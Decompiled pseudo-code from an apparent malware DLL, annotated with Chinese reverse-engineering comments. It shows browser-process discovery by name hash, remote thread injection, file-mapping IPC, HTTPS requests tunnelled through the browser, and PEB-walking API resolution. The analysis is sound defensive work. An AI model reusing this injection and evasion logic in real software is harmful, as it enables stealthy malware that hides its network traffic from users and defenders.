      v6 = bj_sub_1000107F_get_datalentoreceive(hFileMappingObject, (int)&v9) == 0;
      v3 = v9;
      if ( !v6 )                                // v6==0代表前面操作成功
      {
        if ( v9 )
        {
          v7 = bj_sub_1000295A_alloc(++v9);
          *(_DWORD *)a2 = v7;
          v4 = bj_sub_10001103_cpyfromview(hFileMappingObject, (int)v7, (int)&v9);
          v3 = v9;
        }
        else
        {
          v4 = 1;
        }
      }
    }
    while ( v5 != 600 );
  }
  if ( a3 )
    *(_DWORD *)a3 = v3;
  return v4;
}

//----- (10001EB1) --------------------------------------------------------
int __cdecl bj_sub_10001EB1_cpy2view(HANDLE hFileMappingObject, int a2, int a3)
{
  int result; // eax
  int v4; // esi

  result = 0;
  v4 = 0;
  do
  {
    if ( result )
      break;
    Sleep(0xC8u);
    ++v4;
    result = bj_sub_10001205(hFileMappingObject, a2, a3);
  }
  while ( v4 != 600 );
  return result;
}

//----- (10001EE5) --------------------------------------------------------
// *(DWORD*)a1 是  "UAString"
// 返回值是 从filemapping读取到的数据,
// __out__ int *a2 是读到的数据长度
int __cdecl bj_sub_10001EE5(int a1, int *a2)
{
  int v2; // edi
  int v3; // esi
  void *v4; // ebx
  HANDLE v5; // ecx
  DWORD v6; // esi
  int v8; // [esp+Ch] [ebp-18h]
  int v9; // [esp+10h] [ebp-14h]
  HANDLE hRemoteThreadHandle; // [esp+14h] [ebp-10h]
  int v11; // [esp+18h] [ebp-Ch]
  int v12; // [esp+1Ch] [ebp-8h]
  HANDLE hObject; // [esp+20h] [ebp-4h]

  v2 = 0;
  v3 = 0;
  v11 = 0;
  v9 = 0;
  v8 = 0;
  v4 = (void *)bj_sub_10002CF7_getpreselectedprocesshandle((int)&v8);// __Out__ v8 ProcessImageUnicodeNameHash 返回用于说明挑中了哪个进程.
                                                // 作者预定义了3个浏览器进程
  if ( v4 )
  {
    v12 = 0;
    bj_sub_10001399_injectanddosth_do_sub_10001545(v4, (int)&v12);
    if ( v12 )
    {
      hRemoteThreadHandle = bj_sub_10001555_dosth_do_sub_arg3(v4, v12, (LPTHREAD_START_ROUTINE)bj_sub_10001FE7, 0, 0);
      if ( !hRemoteThreadHandle )
        goto LABEL_19;
      v5 = 0;
      hObject = 0;
      do
      {
        if ( v3 == 600 )
          break;
        Sleep(200u);
        ++v3;
        bj_sub_100010D6_OpenFileMapping("DGMNOEP", (int)&hObject);
        v5 = hObject;
      }
      while ( !hObject );                       // 看来远程线程创建了一个filemapping啊,这边一直循环等待
      if ( v5 )
      {
        if ( bj_sub_10002154_collectdata_cpy2view(v5, a1) )
        {
          bj_sub_10001E2F(hObject, (int)&v9, (int)&v11);
          v2 = v11;
        }
        bj_closehandle_sub_10001000(hObject);
      }
      v6 = WaitForSingleObject(hRemoteThreadHandle, 0x1D4C0u);
      CloseHandle(hRemoteThreadHandle);
      if ( !v6 )
LABEL_19:
        bj_sub_1000131E_ZwFreeVirtualMemory(v4, v12);
    }
    bj_sub_10002D6C_ZwClose((int)v4);
    v3 = v9;
  }
  if ( a2 )
    *a2 = v2;
  return v3;
}

//----- (10001FE7) --------------------------------------------------------
int __stdcall bj_sub_10001FE7(LPVOID lpThreadParameter)
{
  void *v1; // ebx
  void *v2; // edi
  unsigned int v3; // eax
  unsigned int v4; // eax
  void *v5; // esi
  unsigned int v6; // eax
  char Mem; // [esp+0h] [ebp-60h]
  LPCSTR lpszAgent; // [esp+28h] [ebp-38h]
  DWORD dwAccessType; // [esp+2Ch] [ebp-34h]
  LPCSTR lpszProxy; // [esp+30h] [ebp-30h]
  LPCSTR lpszServerName; // [esp+34h] [ebp-2Ch]
  LPVOID lpBuffer; // [esp+38h] [ebp-28h]
  LPVOID v14; // [esp+3Ch] [ebp-24h]
  LPCSTR lpszVerb; // [esp+40h] [ebp-20h]
  LPCSTR lpszObjectName; // [esp+44h] [ebp-1Ch]
  LPVOID lpOptional; // [esp+4Ch] [ebp-14h]
  DWORD dwBufferLength; // [esp+50h] [ebp-10h]
  int Buffer; // [esp+54h] [ebp-Ch]
  HANDLE hObject; // [esp+58h] [ebp-8h]
  int var1; // [esp+5Fh] [ebp-1h]

  hObject = 0;
  if ( bj_sub_1000100E_CreateIfNotExists_FileMapping("DGMNOEP", (int)&hObject) && hObject )
  {
    qmemcpy(&lpszAgent, bj_sub_10001C39_cpyfromview(&Mem, hObject), 0x28u);
    v1 = InternetOpenA(lpszAgent, dwAccessType, lpszProxy, 0, 0);
    v2 = InternetConnectA(v1, lpszServerName, 0x1BBu, 0, 0, 3u, 0, 0);
    if ( bj_sub_10002D28_strlen((int)lpBuffer) && bj_sub_10002D28_strlen((int)v14) )// proxyusername和proxypassword
    {
      v3 = bj_sub_10002D28_strlen((int)lpBuffer);
      InternetSetOptionA(v2, 0x2Bu, lpBuffer, v3);
      v4 = bj_sub_10002D28_strlen((int)v14);
      InternetSetOptionA(v2, 0x2Cu, v14, v4);
    }
    v5 = HttpOpenRequestA(v2, lpszVerb, lpszObjectName, 0, 0, 0, 0x800000u, 0);
    bj_sub_10001D56(v5);
    v6 = bj_sub_10002D28_strlen((int)lpOptional);
    if ( HttpSendRequestA(v5, 0, 0, lpOptional, v6) )
    {
      Buffer = 0;
      dwBufferLength = 4;
      HttpQueryInfoA(v5, 0x20000013u, &Buffer, &dwBufferLength, 0);
      LOBYTE(var1) = 0x34;
      if ( Buffer == 200 || Buffer == 404 )
        LOBYTE(var1) = 0x32;                    // 成功标志
      bj_sub_10001EB1_cpy2view(hObject, (int)&var1, 1);
    }
    InternetCloseHandle(v5);
    InternetCloseHandle(v2);
    InternetCloseHandle(v1);
    bj_sub_100015CD_allfree((LPVOID *)&lpszAgent);
    bj_closehandle_sub_10001000(hObject);
  }
  return 0;
}

//----- (10002154) --------------------------------------------------------
// 返回1代表成功
int __cdecl bj_sub_10002154_collectdata_cpy2view(HANDLE hFileMappingObject, int a2)
{
  signed int v2; // edi
  _DWORD *v3; // esi
  unsigned int lenUAString; // eax
  int v5; // ecx
  int v6; // edx
  bool v7; // zf
  int v8; // eax
  unsigned int lenProxyName; // eax
  int v10; // ecx
  int v11; // edx
  int v12; // eax
  unsigned int lenservertoconnect; // eax
  int v14; // ecx
  int v15; // edx
  int v16; // eax
  unsigned int lenProxyUserName; // eax
  int v18; // ecx
  int v19; // edx
  int v20; // eax
  unsigned int v21; // eax
  int v22; // ecx
  int v23; // edx
  int v24; // eax
  unsigned int v25; // eax
  int v26; // ecx
  int v27; // edx
  int v28; // eax
  unsigned int v29; // eax
  int v30; // ecx
  int v31; // edx
  int v32; // eax
  unsigned int v33; // eax
  int v34; // ecx
  int v35; // edx
  int v36; // eax
  unsigned int v37; // eax
  int v38; // ecx
  int v39; // edx
  int v40; // eax
  void *v41; // ebx
  LPVOID v42; // eax
  void *v43; // esi
  int v45; // [esp+8h] [ebp-4h]

  v2 = 0;
  if ( hFileMappingObject
    && *(_DWORD *)a2
    && *(_DWORD *)(a2 + 0xC)
    && *(_DWORD *)(a2 + 0x18)
    && *(_DWORD *)(a2 + 0x1C)
    && *(_DWORD *)(a2 + 0x24) )
  {
    v3 = bj_sub_1000295A_alloc(0x50u);
    lenUAString = bj_sub_10002D28_strlen(*(_DWORD *)a2);
    v5 = 0;
    v6 = lenUAString + 1;
    v7 = *(_DWORD *)a2 == 0;
    *v3 = *(_DWORD *)a2;
    v8 = a2 + 4;
    if ( !v7 )
      v5 = v6;
    v3[1] = v5;
    v3[2] = v8;
    v3[3] = v8 != 0 ? 4 : 0;
    lenProxyName = bj_sub_10002D28_strlen(*(_DWORD *)(a2 + 8));
    v10 = 0;
    v11 = lenProxyName + 1;
    v12 = *(_DWORD *)(a2 + 8);
    v3[4] = v12;
    if ( v12 )
      v10 = v11;
    v3[5] = v10;
    lenservertoconnect = bj_sub_10002D28_strlen(*(_DWORD *)(a2 + 0xC));
    v14 = 0;
    v15 = lenservertoconnect + 1;
    v16 = *(_DWORD *)(a2 + 0xC);
    v3[6] = v16;
    if ( v16 )
      v14 = v15;
    v3[7] = v14;
    lenProxyUserName = bj_sub_10002D28_strlen(*(_DWORD *)(a2 + 0x10));
    v18 = 0;
    v19 = lenProxyUserName + 1;
    v20 = *(_DWORD *)(a2 + 0x10);
    v3[8] = v20;
    if ( v20 )
      v18 = v19;
    v3[9] = v18;
    v21 = bj_sub_10002D28_strlen(*(_DWORD *)(a2 + 0x14));
    v22 = 0;
    v23 = v21 + 1;
    v24 = *(_DWORD *)(a2 + 0x14);
    v3[0xA] = v24;
    if ( v24 )
      v22 = v23;
    v3[0xB] = v22;
    v25 = bj_sub_10002D28_strlen(*(_DWORD *)(a2 + 0x18));
    v26 = 0;
    v27 = v25 + 1;
    v28 = *(_DWORD *)(a2 + 0x18);
    v3[0xC] = v28;
    if ( v28 )
      v26 = v27;
    v3[0xD] = v26;
    v29 = bj_sub_10002D28_strlen(*(_DWORD *)(a2 + 0x1C));
    v30 = 0;
    v31 = v29 + 1;
    v32 = *(_DWORD *)(a2 + 0x1C);
    v3[0xE] = v32;
    if ( v32 )
      v30 = v31;
    v3[0xF] = v30;
    v33 = bj_sub_10002D28_strlen(*(_DWORD *)(a2 + 0x20));
    v34 = 0;
    v35 = v33 + 1;
    v36 = *(_DWORD *)(a2 + 0x20);
    v3[0x10] = v36;
    if ( v36 )
      v34 = v35;
    v3[0x11] = v34;
    v37 = bj_sub_10002D28_strlen(*(_DWORD *)(a2 + 36));
    v38 = 0;
    v45 = 0;
    v39 = v37 + 1;
    v40 = *(_DWORD *)(a2 + 0x24);
    v3[0x12] = v40;
    v41 = v3;
    if ( v40 )
      v38 = v39;
    v3[0x13] = v38;
    v42 = bj_sub_10001D91((unsigned int)v3, 0xA, (SIZE_T *)&v45);
    v43 = v42;
    if ( v42 )
    {
      if ( bj_sub_10001EB1_cpy2view(hFileMappingObject, (int)v42, v45) )
        v2 = 1;
      bj_sub_10002A8F_free(v43);
    }
    bj_sub_10002A8F_free(v41);
  }
  return v2;
}

//----- (100022E7) --------------------------------------------------------
// a3: 1/0  big to small
int __cdecl bj_sub_100022E7_generateanciistringhash(unsigned __int8 *a1, unsigned int a2, int a3)
{
  unsigned __int8 *v3; // esi
  int v4; // edi
  unsigned int v5; // ebx
  unsigned __int8 v6; // al

  v3 = a1;
  v4 = 0;
  if ( a1 )
  {
    v5 = 0;
    while ( !a2 || v5 < a2 )
    {
      v6 = *v3;
      if ( !*v3 )
        break;
      HIBYTE(a1) = *v3;
      if ( a3 )
      {
        bj_sub_10002393_big2small((_BYTE *)&a1 + 3);// 为什么是+3而不是+1呢,  大小尾转换呢?
        v6 = HIBYTE(a1);
      }
      v4 = 0x19660D * v4 + v6 + 0x3C6EF35F;
      ++v5;
      ++v3;
    }
  }
  return v4;
}

//----- (1000233B) --------------------------------------------------------
// unicodestring, 0, 1
int __cdecl bj_sub_1000233B_generateunicodestringhash(unsigned __int16 *a1, unsigned int a2, int a3)
{
  unsigned __int16 *v3; // esi
  int v4; // edi
  unsigned int v5; // ebx
  unsigned __int16 v6; // ax

  v3 = a1;
  v4 = 0;
  if ( a1 )
  {
    v5 = 0;
    while ( !a2 || v5 < a2 )
    {
      v6 = *v3;
      if ( !*v3 )
        break;
      a1 = (unsigned __int16 *)*v3;
      if ( a3 )
      {
        bj_sub_100023AC_Big2Small(&a1);
        LOBYTE(v6) = (_BYTE)a1;
      }
      v4 = 0x19660D * v4 + (unsigned __int8)v6 + 0x3C6EF35F;
      ++v5;
      ++v3;
    }
  }
  return v4;
}

//----- (10002393) --------------------------------------------------------
_BYTE *__cdecl bj_sub_10002393_big2small(_BYTE *a1)
{
  _BYTE *result; // eax
  char v2; // cl

  result = a1;
  v2 = *a1;
  if ( *a1 >= 0x41 && v2 <= 0x5A )
    *a1 = v2 + 0x20;
  return result;
}

//----- (100023AC) --------------------------------------------------------
_WORD *__cdecl bj_sub_100023AC_Big2Small(_WORD *a1)
{
  _WORD *result; // eax
  unsigned int v2; // ecx

  result = a1;
  v2 = (unsigned __int16)*a1;
  if ( v2 >= 0x41 && v2 <= 0x5A )
    *a1 = v2 + 0x20;
  return result;
}

//----- (100023C7) --------------------------------------------------------
unsigned int __cdecl bj_sub_100023C7_strlen(const char *a1)
{
  unsigned int v1; // ecx

  v1 = 0;
  if ( a1 )
    v1 = strlen(a1);
  return v1;
}

//----- (100023E3) --------------------------------------------------------
// 在a1开始的一段A版字符串, 从末尾开始往前寻找0x2e, 找到后返回地址
_BYTE *__cdecl bj_sub_100023E3(const char *a1, char a2)
{
  _BYTE *v2; // edi
  const char *v3; // ecx
  char v4; // al
  _BYTE *v5; // ecx

  v2 = 0;
  if ( a1 && *a1 )
  {
    v3 = &a1[bj_sub_100023C7_strlen(a1) - 1];
    do
      v4 = *v3--;
    while ( v4 != a2 && v3 >= a1 );
    v5 = v3 + 1;
    if ( *v5 == a2 )
      v2 = v5;
  }
  return v2;
}

//----- (1000241C) --------------------------------------------------------
// 将十进制数字的字符串转换为数字
int __cdecl bj_sub_1000241C_atoi(char *a1)
{
  char *v1; // edx
  int v2; // ecx
  char v3; // al

  v1 = a1;
  v2 = 0;
  if ( a1 )
  {
    while ( 1 )
    {
      v3 = *v1;
      if ( *v1 < 0x30 || v3 > 0x39 )
        break;
      v2 = v3 + 10 * v2 - 0x30;
      ++v1;
    }
  }
  return v2;
}

//----- (10002444) --------------------------------------------------------
// arg1: asciinamehash
// arg2: hdllbase
// arg3: 1
// 
// 返回1代表操作成功
// 这个函数似乎是查找那条peb_ldr_data链, 然后找到对应的dll项,并把Dllbase改成arg2
signed int __cdecl bj_sub_10002444(int a1, int *a2, int a3)
{
  int v3; // edi
  int *v4; // eax
  int **v5; // esi
  int *v7; // [esp+4h] [ebp-4h]

  v3 = 0;
  if ( a1 && a2 )
  {
    v4 = (int *)(*(_DWORD *)(__readfsdword(0x30u) + 0xC) + 0xC);
    v7 = v4;
    v5 = (int **)*v4;
    while ( v5 != (int **)v4 )
    {
      if ( bj_sub_1000233B_generateunicodestringhash((unsigned __int16 *)v5[0xC], *((unsigned __int16 *)v5 + 0x16), a3) == a1 )
      {
        v5[6] = a2;
        return 1;
      }
      v5 = (int **)*v5;
      v4 = v7;
    }
  }
  return v3;
}

//----- (1000249C) --------------------------------------------------------
// arg1: lpszdllname
// arg2: hdllbase
// arg3: 0
signed int __cdecl bj_sub_1000249C(unsigned __int8 *a1, int *a2, int a3)
{
  signed int result; // eax
  int v4; // eax

  result = 0;
  if ( a1 )
  {
    v4 = bj_sub_100022E7_generateanciistringhash(a1, 0, a3 == 0);
    result = bj_sub_10002444(v4, a2, a3 == 0);
  }
  return result;
}

//----- (100024C9) --------------------------------------------------------
unsigned int __cdecl bj_sub_100024C9_findImagebase(_DWORD (__cdecl *a1)(_DWORD))
{
  unsigned int v1; // ecx
  unsigned int result; // eax
  unsigned int v3; // ecx
  unsigned int v4; // edx

  v1 = (unsigned int)a1;
  result = 0;
  if ( !a1 )
    v1 = (unsigned int)bj_sub_100024C9_findImagebase;// 这个是函数自己
  v3 = v1 & 0xFFFF0000;                         // 得到加载基址
  do
  {
    if ( *(_WORD *)v3 == 0x5A4D )
    {
      v4 = *(_DWORD *)(v3 + 0x3C);
      if ( v4 < 0x300 && *(_DWORD *)(v4 + v3) == 0x4550 )// 这个判断,深有体会,有些PE文件,这个值是瞎J8填的.
        result = v3;
    }
    v3 -= 4096;                                 // 通过检验两个标志来确认此处是加载基址.
                                                // 如果不是,那么继续往前找
  }
  while ( !result );
  return result;
}

//----- (1000250C) --------------------------------------------------------
// *a1==0
int __cdecl bj_sub_1000250C(_DWORD *a1)
{
  int result; // eax

  if ( a1 )
    *a1 = 0xCDCB4E50;
  result = bj_sub_10002592_findtargetprocessIDByUnicodeNameHash_itsPID_equals_ParentPID(0xCDCB4E50, 1);// iexplore.exe
  if ( !result )
  {
    result = bj_sub_10002753_findtargetprocessIDByUnicodeNameHash_findfirst_nootherrequirements(0xCDCB4E50, 1);
    if ( !result )
    {
      if ( a1 )
        *a1 = 0x70297938;
      result = bj_sub_10002592_findtargetprocessIDByUnicodeNameHash_itsPID_equals_ParentPID(0x70297938, 1);// firefix.exe
      if ( !result )
      {
        result = bj_sub_10002753_findtargetprocessIDByUnicodeNameHash_findfirst_nootherrequirements(0x70297938, 1);
        if ( !result )
        {
          if ( a1 )
            *a1 = 0x723F0158;
          result = bj_sub_10002592_findtargetprocessIDByUnicodeNameHash_itsPID_equals_ParentPID(0x723F0158, 1);// chrome.exe
          if ( !result )
          {
            result = bj_sub_10002753_findtargetprocessIDByUnicodeNameHash_findfirst_nootherrequirements(0x723F0158, 1);
            if ( !result )
            {
              if ( a1 )
                *a1 = 0;
            }
          }
        }
      }
    }
  }
  return result;
}                                               // 返回的是PID

//----- (10002592) --------------------------------------------------------
// 0xCDCB4E50, 1
// 0x70297938, 1
// 0x723F0158, 1
int __cdecl bj_sub_10002592_findtargetprocessIDByUnicodeNameHash_itsPID_equals_ParentPID(int a1, int a2)
{
  int v2; // esi
  char *v3; // eax
  unsigned int v4; // edx
  char *v5; // ebx
  unsigned int v6; // ecx
  int v7; // ebx
  int *v8; // edi
  int *v9; // eax
  int pid; // ebx
  char *v12; // [esp+8h] [ebp-Ch]
  int v13; // [esp+Ch] [ebp-8h]
  unsigned int v14; // [esp+10h] [ebp-4h]

  v2 = 0;
  v14 = 0;
  v3 = bj_sub_100027AC_GetTargetProcessName_PID_ParentPID_ByUnicodeNameHash(a1, a2, &v14);
  v4 = v14;
  v5 = v3;
  v6 = 0;
  v12 = v3;
  if ( v14 )
  {
    v7 = (int)(v3 + 8);
    v13 = (int)(v3 + 8);
    v8 = (int *)(v3 + 8);
    do
    {
      if ( v2 )
        break;
      v14 = 0;
      v9 = (int *)v7;
      pid = *v8;
      do
      {
        if ( v2 )
          break;
        if ( pid == v9[1] )                     // v9[1]是parent PID
          v2 = *v9;
        v9 += 4;
        ++v14;
      }
      while ( v14 < v4 );                       // 就是找到PID==ParentPID的进程
      v7 = v13;
      v8 += 4;
      ++v6;
    }
    while ( v6 < v4 );                          // 似乎没有必要两层循环... 
    v5 = v12;
  }
  bj_sub_10002A8F_free(v5);
  return v2;
}

//----- (10002609) --------------------------------------------------------
// 传入的参数集合之一可能为: 0xa4137e37,1,0
int *__cdecl bj_sub_10002609_finddllbasebyunicodenamehash(int a1, int a2, unsigned int a3)
{
  int *v3; // edi
  unsigned int v4; // eax
  int ***v5; // ebx
  int **v6; // esi
  int v7; // ecx

  v3 = 0;
  if ( a1 )
  {
    v4 = __readfsdword(0x30u);                  // peb
    if ( v4 )
    {
      v5 = (int ***)(*(_DWORD *)(v4 + 0xC) + 0xC);// InLoadOrderModuleList的地址
      v6 = *v5;                                 // PLDR_DATA_TABLE_ENTRY
      do
      {
        if ( v6 == (int **)v5 )
          break;
        v7 = 0;
        if ( a3 <= *((unsigned __int16 *)v6 + 0x16) )// BasedllName中的length
          v7 = bj_sub_1000233B_generateunicodestringhash((unsigned __int16 *)v6[0xC], a3, a2);// basedll中的buffer
        if ( v7 == a1 )
          v3 = v6[6];                           // 该dll的加载基址
        else
          v6 = (int **)*v6;                     // 继续找
      }
      while ( !v3 );
    }
  }
  return v3;
}

//----- (10002661) --------------------------------------------------------
// ntdllbase, 0xA2EA8AFA, 1, 0
unsigned int __cdecl bj_sub_10002661_getprocaddrbyasciinamehash(int a1, int a2, int a3, int a4)
{
  int v4; // edi
  unsigned int v5; // esi
  int v6; // ecx
  int v7; // eax
  _DWORD *v8; // ecx
  int v9; // ebx
  _DWORD *addrofnames; // edx
  unsigned __int16 *v11; // esi
  int v12; // eax
  int v14; // [esp+8h] [ebp-14h]
  int v15; // [esp+Ch] [ebp-10h]
  unsigned int numofnames; // [esp+10h] [ebp-Ch]
  int addrofords; // [esp+14h] [ebp-8h]
  unsigned int v18; // [esp+18h] [ebp-4h]
  int v19; // [esp+24h] [ebp+8h]

  v4 = a1;
  v5 = 0;
  if ( a1 )
  {
    if ( a2 )
    {
      if ( *(_WORD *)a1 == 0x5A4D )
      {
        v6 = *(_DWORD *)(a1 + 0x3C);
        if ( *(_DWORD *)(v6 + a1) == 0x4550 )
        {
          v7 = *(_DWORD *)(v6 + a1 + 0x78);     // 导出表RVA
          v14 = *(_DWORD *)(v6 + a1 + 0x7C);    // 导出表Size
          v8 = (_DWORD *)(v7 + a1);
          v9 = -1;
          v15 = v7 + a1;
          if ( HIWORD(a2) )
          {
            addrofnames = (_DWORD *)(a1 + v8[8]);
            addrofords = a1 + v8[9];
            v19 = a1 + v8[8];
            numofnames = v8[6];
            v18 = 0;
            if ( !numofnames )
              return v5;
            v11 = (unsigned __int16 *)addrofords;
            do
            {
              if ( v9 != -1 )                   // 已经找到序号了
                break;
              v12 = bj_sub_100022E7_generateanciistringhash((unsigned __int8 *)(v4 + *addrofnames), a4, a3);
              addrofnames = (_DWORD *)v19;
              if ( v12 == a2 )                  // 函数名hash值比较
              {
                v9 = *v11;
              }
              else
              {
                addrofnames = (_DWORD *)(v19 + 4);
                ++v11;
                v19 += 4;
              }
              ++v18;
            }
            while ( v18 < numofnames );
            v8 = (_DWORD *)v15;
            v5 = 0;
          }
          else
          {
            v9 = (unsigned __int16)a2 - v8[4];  // 这里减去dllbase,居然是序号??
          }
          if ( v9 >= 0 )
          {
            v5 = v4 + *(_DWORD *)(v8[7] + 4 * v9 + v4);// v5为函数地址的VA
            if ( v5 > (unsigned int)v8 && v5 < (unsigned int)v8 + v14 )// 为什么函数地址会在这个段?? 不应该啊
              v5 = bj_sub_1000286A(v5);         //   果然不应该在这个段, 这个判断写出来是为了骗人的.........
                                                //   不对,这个应该是某种特殊情况的处理. 没必要写个这样的东西骗人
                                                //   很有可能是作者的DLL的特别处理
          }
        }
      }
    }
  }
  return v5;
}

//----- (10002753) --------------------------------------------------------
int __cdecl bj_sub_10002753_findtargetprocessIDByUnicodeNameHash_findfirst_nootherrequirements(int a1, int a2)
{
  int v2; // ebx
  unsigned __int16 *v3; // eax
  void *v4; // edi
  unsigned __int16 *v5; // esi
  int v7; // [esp+4h] [ebp-4h]

  v2 = 0;
  if ( a1 )
  {
    v3 = (unsigned __int16 *)bj_sub_100028D5(5);
    v4 = v3;
    if ( v3 )
    {
      v5 = v3;
      do
      {
        v7 = *(_DWORD *)v5;
        if ( !*(_DWORD *)v5 )
          break;
        if ( bj_sub_1000233B_generateunicodestringhash(*((unsigned __int16 **)v5 + 0xF), v5[0x1C], a2) == a1 )
          v2 = *((_DWORD *)v5 + 0x11);          // PID
        v5 = (unsigned __int16 *)((char *)v5 + v7);
      }
      while ( !v2 );
      bj_sub_10002A8F_free(v4);
    }
  }
  return v2;
}

//----- (100027AC) --------------------------------------------------------
// _DWORD _Out_ *a3   如果找到目标进程,那么就是1
char *__cdecl bj_sub_100027AC_GetTargetProcessName_PID_ParentPID_ByUnicodeNameHash(int a1, int a2, _DWORD *a3)
{
  char *v3; // esi
  _DWORD *v4; // eax
  _DWORD *v5; // ebx
  _DWORD *i; // esi
  char *v7; // eax
  _DWORD *v8; // esi
  _DWORD *v9; // edi
  char *v11; // [esp+18h] [ebp+10h]

  v3 = 0;
  if ( a3 )
  {
    *a3 = 0;
    v4 = bj_sub_100028D5(5);
    v5 = v4;
    if ( v4 )
    {
      for ( i = v4; *i; i = (_DWORD *)((char *)i + *i) )
      {
        if ( !a1
          || bj_sub_1000233B_generateunicodestringhash((unsigned __int16 *)i[0xF], *((unsigned __int16 *)i + 0x1C), a2) == a1 )
        {                                       // arg1是ImageName,arg2是length
          ++*a3;                                // 这里可以保证如果有多个同名进程,那么照样全部收集
        }
      }
      v7 = (char *)bj_sub_1000295A_alloc(16 * *a3);
      v8 = v5;
      v11 = v7;
      if ( *v5 )
      {
        v9 = v7 + 0xC;
        do
        {
          v8 = (_DWORD *)((char *)v8 + *v8);
          if ( !a1
            || bj_sub_1000233B_generateunicodestringhash(
                 (unsigned __int16 *)v8[0xF],
                 *((unsigned __int16 *)v8 + 0x1C),
                 a2) == a1 )
          {
            *(v9 - 3) = v8[0xE];
            *(v9 - 2) = v8[0xF];
            *(v9 - 1) = v8[0x11];               // PVOID UniqueProcessId
            *v9 = v8[0x12];                     // PVOID InheritedFromUniqueProcessId;
            v9 += 4;
          }
        }
        while ( *v8 );
      }
      bj_sub_10002A8F_free(v5);
      v3 = v11;
    }
  }
  return v3;
}

//----- (1000286A) --------------------------------------------------------
// 此时a1就是形如 dllname.#23  dllname.funcname
// 这样的字符串地址
// 返回值就是获取的对应的函数地址
unsigned int __cdecl bj_sub_1000286A(int a1)
{
  unsigned int v1; // edi
  _BYTE *v2; // esi
  int v3; // eax
  int *v4; // ebx
  int v5; // esi
  int v6; // eax

  v1 = 0;
  if ( a1 )
  {
    v2 = bj_sub_100023E3((const char *)a1, 0x2E);
    v3 = bj_sub_100022E7_generateanciistringhash((unsigned __int8 *)a1, (unsigned int)&v2[-a1], 1);
    v4 = bj_sub_10002609_finddllbasebyunicodenamehash(v3, 1, (unsigned int)&v2[-a1]);
    v5 = (int)(v2 + 1);
    if ( *(_BYTE *)v5 == 0x23 )                 // #
      v6 = bj_sub_1000241C_atoi((char *)(v5 + 1));
    else
      v6 = bj_sub_100022E7_generateanciistringhash((unsigned __int8 *)v5, 0, 1);
    v1 = bj_sub_10002661_getprocaddrbyasciinamehash((int)v4, v6, 1, 0);
  }
  return v1;
}

//----- (100028D5) --------------------------------------------------------
// 5    SystemProcessInformation
void *__cdecl bj_sub_100028D5(int a1)
{
  void *v1; // esi
  int *v2; // eax
  int (__thiscall *v3)(int, int, LPVOID, SIZE_T, int *); // ebx
  SIZE_T v4; // edi
  LPVOID v5; // eax
  int v6; // eax
  int v8; // [esp-Ch] [ebp-14h]
  int v9; // [esp+4h] [ebp-4h]

  v1 = 0;
  v2 = bj_sub_10002609_finddllbasebyunicodenamehash(0xA4137E37, 1, 0);// 这里找的是ntdll的加载基址
  if ( v2 )
  {
    v3 = (int (__thiscall *)(int, int, LPVOID, SIZE_T, int *))bj_sub_10002661_getprocaddrbyasciinamehash(
                                                                (int)v2,
                                                                0xA2EA8AFA,
                                                                1,
                                                                0);// ZwQuerySystemInformation
    if ( v3 )
    {
      v4 = 0x8000;
      do
      {
        if ( v1 )
          v5 = bj_realloc_sub_10002AAD(v1, v4);
        else
          v5 = bj_sub_1000295A_alloc(v4);
        v9 = 0;
        v1 = v5;
        v6 = v3(v8, a1, v5, v4, &v9);           // 这TM调用错了吧...
                                                // 没有错, 这里用了thiscall,第一个参数被传入到ecx中,然后4个参数压栈, 这样刚好满足4个参数
        if ( v6 == 0xC0000004 )                 // STATUS_INFO_LENGTH_MISMATCH
          v4 *= 2;
        else
          v4 = 0;
      }
      while ( v4 );
      if ( v6 )
      {
        bj_sub_10002A8F_free(v1);
        v1 = 0;
      }
    }
  }
  return v1;
}

//----- (1000295A) --------------------------------------------------------
LPVOID __cdecl bj_sub_1000295A_alloc(SIZE_T dwBytes)
{
  HANDLE v1; // eax

  v1 = GetProcessHeap();
  return HeapAlloc(v1, 8u, dwBytes);
}

//----- (10002971) --------------------------------------------------------
// a1 字符串
// a2 字符串
// a3 字符串长度
signed int __cdecl bj_sub_10002971_strcmp(_DWORD *a1, char *a2, unsigned int a3)
{
  _DWORD *v3; // edx
  char v4; // bl
  char *v5; // esi
  unsigned int v6; // edi
  signed int result; // eax
  unsigned int v8; // ebx
  int v9; // esi
  unsigned __int8 v10; // ch
  int v11; // [esp+14h] [ebp+8h]

  v3 = a1;                                      // 这个函数跟前面那个strfind一样,感觉也很巧妙
                                                // 功能应该就是strcmp的功能
                                                // 只不过感觉有点问题,因为这里是用DWORD相减来比大小的..
                                                // 所以是第4i个位置的字符大小比较重要..
                                                // 而被4不能整除部分的数据,就是按字节比大小
                                                // "243243" "78456"
  v4 = a3;
  v5 = a2;
  v6 = 0;
  v11 = 0;
  result = 0;
  if ( a3 >> 2 )                                // 相当于if(a3>=4)
  {
    while ( !result )
    {
      v4 = a3;
      v6 = 0;
      if ( *v3 != *(_DWORD *)v5 )
        result = (unsigned int)(*v3 - *(_DWORD *)v5) > 0 ? 1 : -1;
      ++v3;
      v5 += 4;
      if ( ++v11 >= a3 >> 2 )
      {
        if ( result )
          return result;
        goto LABEL_7;
      }
    }
  }
  else
  {
LABEL_7:
    v8 = v4 & 3;
    if ( v8 )
    {
      v9 = v5 - (char *)v3;
      do
      {
        if ( result )
          break;
        v10 = *((_BYTE *)v3 + v9);
        if ( *(_BYTE *)v3 != v10 )
        {
          result = -1;
          if ( *(unsigned __int8 *)v3 - v10 > 0 )
            result = 1;
        }
        v3 = (_DWORD *)((char *)v3 + 1);
        ++v6;
      }
      while ( v6 < v8 );
    }
  }
  return result;
}

//----- (100029F9) --------------------------------------------------------
unsigned int __cdecl bj_strcpy_sub_100029F9(unsigned int a1, _DWORD *a2, unsigned int a3)
{
  _DWORD *v3; // esi
  unsigned int v4; // ebx
  char *v5; // esi
  char *j; // ecx
  int v7; // eax
  unsigned int v8; // edx
  int v9; // esi
  _DWORD *v10; // ebx
  unsigned int i; // ecx
  int v12; // eax
  unsigned int v13; // eax

  if ( a1 )
  {
    v3 = a2;
    if ( a2 )
    {
      if ( a3 )
      {
        if ( a1 <= (unsigned int)a2 || a1 > (unsigned int)a2 + a3 )
        {
          v10 = (_DWORD *)a1;
          for ( i = a3 >> 2; i; --i )
          {
            v12 = *v3;
            ++v3;
            *v10 = v12;
            ++v10;
          }
          v13 = 0;
          if ( a3 & 3 )
          {
            do
            {
              *((_BYTE *)v10 + v13) = *((_BYTE *)v3 + v13);
              ++v13;
            }
            while ( v13 < (a3 & 3) );
          }
        }
        else
        {
          v4 = a3 >> 2;
          v5 = (char *)&a2[(a3 >> 2) - 1];
